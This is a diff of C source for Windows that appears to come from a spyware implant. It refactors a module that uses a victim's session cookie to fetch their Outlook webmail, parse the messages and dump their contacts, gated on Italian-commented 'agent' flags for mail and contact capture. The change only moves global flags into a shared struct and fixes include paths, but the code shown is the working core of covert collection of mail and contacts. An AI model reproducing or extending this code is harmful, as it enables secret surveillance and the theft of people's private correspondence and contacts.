@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "..\common.h"
-#include "..\LOG.h"
+#include "../common.h"
+#include "../bss.h"
+#include "../LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -10,10 +11,6 @@ extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
-
-extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
-extern BOOL bPM_ContactsStarted; 
-extern DWORD max_social_mail_len;
 
 #define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }
 
@@ -132,8 +129,8 @@ DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, 
 		
 		CheckProcessStatus();
 		// Check sulla dimensione stabilita' nell'agente
-		if (response_len > max_social_mail_len)
-			response_len = max_social_mail_len;
+		if (response_len > shared.max_social_mail_len)
+			response_len = shared.max_social_mail_len;
 		// Verifica che non mi abbia risposto con la pagina di login
 		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "From")) {
 			// Toglie eventuali tag <pre>
@@ -224,7 +221,7 @@ DWORD HandleOutlookMail(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
+	if (!shared.bPM_MailCapStarted && !shared.bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Verifica il cookie 
@@ -244,7 +241,7 @@ DWORD HandleOutlookMail(char *cookie)
 	_snprintf_s(curr_user, sizeof(curr_user), _TRUNCATE, "%s", ptr);	
 	SAFE_FREE(r_buffer);
 
-	if (bPM_ContactsStarted) {	
+	if (shared.bPM_ContactsStarted) {
 		// Se e' diverso dall'ultimo username allora lo logga...
 		if (strcmp(curr_user, last_user_name)) {
 			_snprintf_s(last_user_name, sizeof(last_user_name), _TRUNCATE, "%s", curr_user);		
@@ -252,7 +249,7 @@ DWORD HandleOutlookMail(char *cookie)
 		}
 	}
 
-	if (!bPM_MailCapStarted)
+	if (!shared.bPM_MailCapStarted)
 		return ret_val;
 
 	last_tstamp_lo = GetLastFBTstamp(curr_user, &last_tstamp_hi);
